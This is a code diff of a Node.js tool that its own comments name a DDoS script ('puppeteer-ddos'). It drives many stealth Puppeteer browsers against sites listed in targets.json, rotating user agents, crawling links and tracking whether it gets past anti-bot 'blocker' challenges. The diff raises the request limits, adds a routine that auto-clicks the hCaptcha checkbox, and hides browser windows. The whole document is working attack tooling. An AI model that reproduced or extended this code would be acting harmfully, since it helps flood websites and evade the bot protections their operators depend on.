@@ -1,16 +1,18 @@
-#!/usr/bin/env nodejs
-
+#!/usr/bin/env -S   nodejs
 /*
     apt update
     apt install npm
     npm install --save puppeteer puppeteer-extra puppeteer-extra-plugin-stealth axios minimist
+    ip netns exec netc0   /sbin/runuser  -u user  -g user   --   node --prof  /root/DDOS/puppeteer-ddos/puppeteer-ddos.cli.js
+
+    node --prof-process isolate-0xnnnnn-v8.log > processed.txt
 */
 
 let settings = {
-    consecutivePlainRequestsLimit: 20,
+    consecutivePlainRequestsLimit: 50,
     delayAfterIteration: 50,
     simultaneousBrowserNavigationsLimit: 100,
-    waitForCaptchaResolutionTimeout: 10 * 60,
+    waitForCaptchaResolutionTimeout: 15 * 60,
     waitForChallengeDisapearTimeout: 60
 }
 
@@ -20,6 +22,20 @@ const fs = require('fs');
 const util = require('util');
 const axios = require('axios').default;
 const minimist = require('minimist')(process.argv.slice(2));
+
+/*const profiler = require('v8-profiler');
+profiler.startProfiling('probe', true);
+setTimeout(
+    () => {
+        profile = profiler.stopProfiling('probe');
+        profile.export((error, result) => {
+            fs.writeFileSync(__dirname + '/ddos.cpuprofile', result);
+            profile.delete();
+            process.exit();
+        });
+    },
+    10000
+);*/
 
 let tempDir = val(()=> minimist['working-directory']);
 if (!tempDir) {
@@ -32,6 +48,7 @@ const dumpScreenShots = false;
 const screenShotDir   = tempDir + '/dump-screenshots';
 const dumpHtml        = false;
 const dumpHtmlDir     = tempDir + '/dump-html';
+
 settings.entryUrls    = JSON.parse(fs.readFileSync(__dirname + '/targets.json'));
 
 const userAgents = [
@@ -49,7 +66,7 @@ fs.mkdirSync(screenShotDir, { recursive: true });
 fs.mkdirSync(dumpHtmlDir, { recursive: true });
 
 let glob = {
-    puppeteer: require('puppeteer-extra'),
+    puppeteer:     require('puppeteer-extra'),
     stealthPlugin: require('puppeteer-extra-plugin-stealth'),
     term: {
         clear: "\033[0m",
@@ -84,7 +101,7 @@ class Thread
     browser;
     browserPage;
     isBrowserVisible;
-    browserWids;
+    browserMainWids;
     links         = [];
     badLinks      = [];
     cookies       = [];
@@ -100,6 +117,7 @@ class Thread
     successfulIterationsCount = 0;
     logBuffer;
     logObject;
+    httpGetType;
     networkRequestsCount;
     diskRequestsCount;
     failedRequestsUrls;
@@ -150,7 +168,7 @@ class Thread
             }
 
             if (
-                    this.iterationsCount > 20
+                    this.iterationsCount > 50
                 &&  this.links.length    < 10
             ) {
                 errorMessage = `Not enough links collected (${this.links.length})`;
@@ -158,7 +176,7 @@ class Thread
 
             if (
                     this.iterationsCount > 50
-                &&  this.failedIterationsCount > this.successfulIterationsCount / 2
+                &&  this.failedIterationsCount > this.successfulIterationsCount - 10
             ) {
                 errorMessage = `Too many failed connections (${this.failedIterationsCount} of ${this.successfulIterationsCount})`;
             }
@@ -224,21 +242,22 @@ class Thread
             }
 
             this.logObject.success                   = success;
+            this.logObject.httpGetType               = this.httpGetType;
+            this.logObject.requireBlockerBypass      = this.requireBlockerBypass;
+            this.logObject.bypassSuccessfulCount     = this.bypassSuccessfulCount;
+            this.logObject.bypassFailedCount         = this.bypassFailedCount;
             this.logObject.iterationsCount           = this.iterationsCount;
             this.logObject.successfulIterationsCount = this.successfulIterationsCount;
             this.logObject.failedIterationsCount     = this.failedIterationsCount;
-            this.logObject.type                      = 'http-get';
             this.logObject.currentUrl                = this.currentUrl;
             this.logObject.previousUrl               = this.previousUrl;
             this.logObject.cookiesCount              = this.cookies.length;
             this.logObject.linksCount                = this.links.length;
             this.logObject.badLinksCount             = this.badLinks.length;
-            this.logObject.requireBlockerBypass      = this.requireBlockerBypass;
-            this.logObject.bypassSuccessfulCount     = this.bypassSuccessfulCount;
-            this.logObject.bypassFailedCount         = this.bypassFailedCount;
             this.logObject.networkRequestsCount      = this.networkRequestsCount;
             this.logObject.diskRequestsCount         = this.diskRequestsCount;
             this.logObject.failedRequestsUrls        = this.failedRequestsUrls;
+            this.logObject.type                      = 'http-get';
             this.logObject.duration                  = Math.floor(new Date().getTime() - this.startedAt);
             
             this.#printLogObject(this.logObject, !success);
@@ -266,7 +285,7 @@ class Thread
             responseHeaders,
             maxContentLengthExceeded = false;
 
-        this.logObject.httpGetType = 'plain';
+        this.httpGetType = 'plain';
 
         main: {
             let headers = {
@@ -423,7 +442,7 @@ class Thread
         let requireBlockerBypassBeforeNavigate = this.requireBlockerBypass;
         let captchaWasFound = false;
 
-        this.logObject.httpGetType = 'render';
+        this.httpGetType = 'render';
 
         main: {
             if (!await this.#restartInvisibleBrowser()) {
@@ -524,7 +543,7 @@ class Thread
 
                         pageAllFramesContent = await this.#getBrowserPageAllFramesContent();
                         if (!pageAllFramesContent) {
-                            this.logObject.message += "Failed to get all frames content\n";
+                            this.logObject.message += "Failed to get all frames content. Wait\n";
                             continue;
                         }
 
@@ -545,6 +564,7 @@ class Thread
                                     windowTitle += 'Captcha';
                                     await this.browserPage.evaluate(`document.title = '${windowTitle}'`);
                                     await this.#setBrowserWindowVisible(true);
+                                    //await this.#activateCaptcha();
                                     // ---
                                     this.#printLogObject({
                                         thread:               this.id,
@@ -632,6 +652,7 @@ class Thread
 
         }  // end of main
 
+        await this.#setBrowserWindowVisible(false);
         return ret;
     }
 
@@ -651,16 +672,14 @@ class Thread
         let ret = true;
 
         if (! await this.#checkBrowserIsRunning()) {
-            ret = false;
-            this.browser = undefined;
-            let timeout = new Date().getTime() + 10 * 1000;
-
-            do {
+            main: {
+                ret = false;
+                this.browser = undefined;
 
                 let runningBrowsersPids = await getRunningBrowsersPids();
                 if (runningBrowsersPids.length >= 50) {
                     this.logObject.message += "Too many browsers launched. Wait\n";
-                    while (runningBrowsersPids.length >= 50) {
+                    while (runningBrowsersPids.length >= 40) {
                         await this.#sleep(1000);
                     }
                 }
@@ -670,96 +689,127 @@ class Thread
                     this.browser = await glob.puppeteer.launch(this.puppeteerOptions);
                     if (this.browser) {
                         if (await this.#openBrowserPage()) {
-                            this.isBrowserVisible = true;
+                            this.browserMainWids = await this.#getBrowserWids(true);
                             await this.#setBrowserWindowVisible(false);
+                            // ---
                             ret = true;
-                            break;
+                            break main;
                         }
                     }
                 } catch (e) {
                     this.logObject.message += e.toString() + "\n";
                 }
 
+                this.logObject.message += "Failed to launch browser\n";
                 await this.#closeBrowser();
-                this.logObject.message += "Failed to launch browser. Wait\n";
-                await this.#sleep(1000);
-            } while (new Date().getTime() < timeout)
+            }
         }
 
         return ret;
     }
 
+    #closeBrowser = async function()
+    {
+        try {
+            if (this.browser) {
+                await this.browser.close();  // Don't add QueryBrowser here. It will close the browser of next iteration
+            }
+        } catch (e) {}
+        this.browser = undefined;
+    }
+
     #openBrowserPage = async function() {
 
-        let timeout = new Date().getTime() + 10 * 1000;
-        do {
-            try {
+      try {
+
+            let browserPages = await this.browser.pages();
+            let browserPagesKeys = Object.keys(browserPages);
+            this.browserPage = browserPages[browserPagesKeys[0]];
+
+            if (this.browserPage.url() === 'about:blank') {
+
+                await this.#queryBrowser( async () => await this.browserPage.setUserAgent(this.userAgent) );
+                if (this.previousUrl) {
+                    await this.#queryBrowser( async () => await this.browserPage.setExtraHTTPHeaders({referer: this.previousUrl}) );
+                }
+
+                for (let cookie of this.cookies) {
+                    await this.browserPage.setCookie(cookie);
+                }
 
                 //---
 
-                let browserPages = await this.browser.pages();
-                let browserPagesKeys = Object.keys(browserPages);
-                this.browserPage = browserPages[browserPagesKeys[0]];
+                await this.browserPage.setRequestInterception(true);
+                this.browserPage.on('request', (HTTPRequest) => {
+                    let blockRequestTypes = ['font', 'image', 'stylesheet'];
+                    let websitesWhiteList = ['hcaptcha.com'];
 
-                if (this.browserPage.url() === 'about:blank') {
-
-                    await this.#queryBrowser( async () => await this.browserPage.setUserAgent(this.userAgent) );
-                    if (this.previousUrl) {
-                        await this.#queryBrowser( async () => await this.browserPage.setExtraHTTPHeaders({referer: this.previousUrl}) );
+                    if (blockRequestTypes.includes(HTTPRequest.resourceType())) {
+                        for (let websiteFromWhiteList of websitesWhiteList) {
+                            if (HTTPRequest.url().includes(websiteFromWhiteList)) {
+                                HTTPRequest.continue();
+                                return;
+                            }
+                        }
+                        HTTPRequest.abort();
+                        return;
                     }
 
-                    for (let cookie of this.cookies) {
-                        await this.browserPage.setCookie(cookie);
+                    HTTPRequest.continue();
+                 });
+
+                //---
+
+                this.browserPage.on('response', (response) => {
+                    if (this.httpGetType !== 'render') {
+                        // Browser will do some network activity, while we are doing plain requests.
+                        // Ignore this activity
+                        return;
                     }
 
-                    //---
+                    let source = response._fromDiskCache ? 'disk' : 'network';
+                    if (source === 'disk') {
+                        this.diskRequestsCount++;
+                    } else {
+                        this.networkRequestsCount++;
+                    }
 
-                    await this.browserPage.setRequestInterception(true);
-                    this.browserPage.on('request', (request) => {
-                        let skipRequestTypes  = [
-                            'font',
-                        ];
-
-                        if (skipRequestTypes.indexOf(request.resourceType()) === -1) {
-                            request.continue();
-                        } else {
-                            request.abort();
-                        }
-                    });
-
-                    //---
-
-                    this.browserPage.on('response', (response) => {
-
-                        let source = response._fromDiskCache ? 'disk' : 'network';
-                        if (source === 'disk') {
-                            this.diskRequestsCount++;
-                        } else {
-                            this.networkRequestsCount++;
-                        }
-
-                        if (debugBrowserCache) {
-                            let url = response.url().substring(0, 120);
-                            this.logObject.message += `${source} ${url}\n`;
-                        }
-                    });
+                    if (debugBrowserCache) {
+                        let url = response.url().substring(0, 120);
+                        this.logObject.message += `${source} ${url}\n`;
+                    }
+                });
 
 
-                    this.browserPage.on('requestfailed', (request) => {
-                        this.failedRequestsUrls.push(request.url());
-                    });
-                }
+                this.browserPage.on('requestfailed', (request) => {
+                    if (this.httpGetType !== 'render') {
+                        // Browser will do some network activity, while we are doing plain requests
+                        // Ignore this activity
+                        return;
+                    }
 
-                return true;
-            } catch (e) {
-                this.logObject.message += e.toString() + "\n";
+                    this.failedRequestsUrls.push(request.url());
+                });
             }
-            await this.#closeBrowserPage();
-            this.logObject.message += "Failed to launch browser page. Wait\n";
-            await this.#sleep(1000);
-        } while (new Date().getTime() < timeout)
 
+            return true;
+        } catch (e) {
+            this.logObject.message += e.toString() + "\n";
+        }
+
+        this.logObject.message += "Failed to launch browser page";
+        await this.#closeBrowserPage();
         return false;
+    }
+
+    #closeBrowserPage = async function()
+    {
+        try {
+            if (this.browserPage) {
+                await this.browserPage.close();  // Don't add QueryBrowser here. It will close the browser of next iteration
+            }
+        } catch (e) {}
+        this.browserPage = undefined;
     }
 
     #getBrowserPageAllFramesContent =  async function() {
@@ -783,58 +833,53 @@ class Thread
         return ret;
     }
 
-    #closeBrowser = async function()
+    #getBrowserWids  = async function(onlyVisible)
     {
-        try {
-            if (this.browser) {
-                await this.#queryBrowser(async () => await this.browser.close());
-            }
-        } catch (e) {}
-        this.browse = undefined;
-    }
-
-    #closeBrowserPage = async function()
-    {
-        try {
-            if (this.browserPage) {
-                await this.#queryBrowser(async () => await this.browserPage.close());
-            }
-        } catch (e) {}
-        this.browserPage = undefined;
-    }
-
-    #readBrowserWids  = async function()
-    {
+        let onlyVisibleArg = onlyVisible  ?  '--onlyvisible' : '';
         let pid = this.browser.process().pid;
-        let execRet = await execShellCommand('/usr/bin/xdotool  search  --onlyvisible  --pid ' + pid);
+        let execRet = await execShellCommand(`/usr/bin/xdotool  search  ${onlyVisibleArg}  --pid ${pid}`);
         if (!execRet.error) {
-            this.browserWids = execRet.stdout.trim().split("\n");
+            return execRet.stdout.trim().split("\n");
         }
     }
 
     #setBrowserWindowVisible = async function(state) {
 
-        if (this.isBrowserVisible === state) {
+        /*if (this.isBrowserVisible === state) {
             return;
-        }
+        }*/
 
-        if (this.isBrowserVisible) {
-            await this.#readBrowserWids();
-        }
-
-        //let command1 = state ? ''            : 'windowminimize';  //'windowraise'
-        let command2 = state ? 'windowmap'   : 'windowunmap';
+        let wids = state  ?  this.browserMainWids : await this.#getBrowserWids(false);
+        let command = state ? 'windowmap'   : 'windowunmap';
         let windowWidth = this.puppeteerOptions.defaultViewport.width;
         let windowHeight = this.puppeteerOptions.defaultViewport.height + 120;
 
-        for (let wid of this.browserWids) {
-            await execShellCommand(    `/usr/bin/xdotool  ${command2}  --sync  ${wid}`);
+        for (let wid of wids) {
+            await execShellCommand(    `/usr/bin/xdotool  ${command}  --sync  ${wid}`);
             if (state) {
-                await execShellCommand(`/usr/bin/xdotool  windowsize   --sync  ${wid}   ${windowWidth}   ${windowHeight}`);
+                await execShellCommand(`/usr/bin/xdotool  windowsize  --sync  ${wid}   ${windowWidth}   ${windowHeight}`);
             }
         }
 
         this.isBrowserVisible = state;
+    }
+
+    #activateCaptcha = async function() {
+        let walkFrameTree = async (frame) => {
+
+            let hCaptchaCheckbox = await this.#queryBrowser(async()=> await frame.$$('#anchor[aria-hidden="false"] > #anchor-wr > #anchor-td > #anchor-tc > #anchor-state > #checkbox'));
+                hCaptchaCheckbox = val(()=> hCaptchaCheckbox[0]);
+            if (hCaptchaCheckbox) {
+                hCaptchaCheckbox.click();
+            }
+
+            // ---
+
+            for (const child of frame.childFrames()) {
+                await walkFrameTree(child);
+            }
+        }
+        await walkFrameTree(this.browserPage.mainFrame());
     }
 
     #queryBrowser = async function(asyncCallback) {
@@ -907,18 +952,11 @@ class Thread
         let skipList = [
             '#',
 
-            '.css',
-            '.gif',
-            '.jpeg',
-            '.jpg',
-            '.png',
-            '.ico',
+            '.css', '.gif', '.jpeg', '.jpg', '.png', '.ico', '.svg',
 
-            '.js',
-            '.css',
+            '.js', '.css', '.webmanifest',
 
-            '.pdf',
-            '.zip'
+            '.pdf', '.zip', '.doc', '.docx'
         ]
 
         for (let skipStr of skipList) {
